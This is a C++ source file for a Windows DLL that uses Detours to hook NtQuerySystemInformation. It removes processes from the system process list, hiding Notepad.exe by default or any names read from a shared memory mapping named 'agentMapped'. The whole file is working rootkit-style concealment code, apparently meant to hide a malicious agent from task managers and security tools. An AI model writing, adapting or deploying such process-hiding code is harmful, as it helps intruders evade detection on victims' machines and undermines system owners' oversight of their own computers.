#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>
#include "pch.h"
#include "detours.h"
#include <string>
#include <locale>
#include <codecvt>
#include <vector>
#include <Winternl.h>

using namespace std;

#define HIDE_PROCESS L"Notepad.exe"

typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

NtQuerySystemInformation_t origNtQuerySystemInformation = NULL;

std::vector<wchar_t*> deserializeWCharTPointerVector(std::wstring fileName) {
    std::vector<wchar_t*> deserializedData;

    HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
    if (!fileMapping || fileMapping == INVALID_HANDLE_VALUE)
        return deserializedData;

    LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!mappedView) {
        CloseHandle(fileMapping);
        return deserializedData;
    }

    std::wstring serializedData(static_cast<const wchar_t*>(mappedView));
    size_t pos = 0;
    wchar_t* token;
    while ((pos = serializedData.find(L',')) != std::wstring::npos) {
        token = (wchar_t*)malloc((pos + 1) * sizeof(wchar_t));
        wcsncpy(token, serializedData.c_str(), pos);
        token[pos] = L'\0';
        deserializedData.push_back(token);
        serializedData.erase(0, pos + 1);
    }

    if (!serializedData.empty()) {
        token = (wchar_t*)malloc((serializedData.size() + 1) * sizeof(wchar_t));
        wcsncpy(token, serializedData.c_str(), serializedData.size());
        token[serializedData.size()] = L'\0';
        deserializedData.push_back(token);
    }

    UnmapViewOfFile(mappedView);
    CloseHandle(fileMapping);

    return deserializedData;
}


NTSTATUS NTAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    vector<wchar_t*> agentVector = deserializeWCharTPointerVector(L"agentMapped");
    if (agentVector.empty()) agentVector.push_back(_wcsdup(HIDE_PROCESS));

    NTSTATUS status = origNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    // Only walk the buffer on success. On STATUS_INFO_LENGTH_MISMATCH or any
    // other error the buffer is partial or empty — walking it causes the crash.
    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation) {
        PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrevious = NULL;

        while (true) {
            if (pCurrent->ImageName.Buffer != NULL && pCurrent->ImageName.Length > 0) {
                std::wstring imageName(pCurrent->ImageName.Buffer, pCurrent->ImageName.Length / sizeof(WCHAR));

                const auto it = std::find_if(agentVector.begin(), agentVector.end(),
                    [&imageName](const wchar_t* nombreProceso) {
                        return imageName.find(nombreProceso) != std::wstring::npos;
                    });

                if (it != agentVector.end()) {
                    if (pPrevious != NULL) {
                        if (pCurrent->NextEntryOffset == 0)
                            pPrevious->NextEntryOffset = 0;
                        else
                            pPrevious->NextEntryOffset += pCurrent->NextEntryOffset;
                    }

                    if (pCurrent->NextEntryOffset == 0) break;
                    pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
                    continue;
                }
            }

            if (pCurrent->NextEntryOffset == 0) break;
            pPrevious = pCurrent;
            pCurrent = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
        }
    }

    for (auto p : agentVector) free(p);

    return status;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        origNtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
        break;
    }
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)origNtQuerySystemInformation, HookedNtQuerySystemInformation);
        DetourTransactionCommit();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}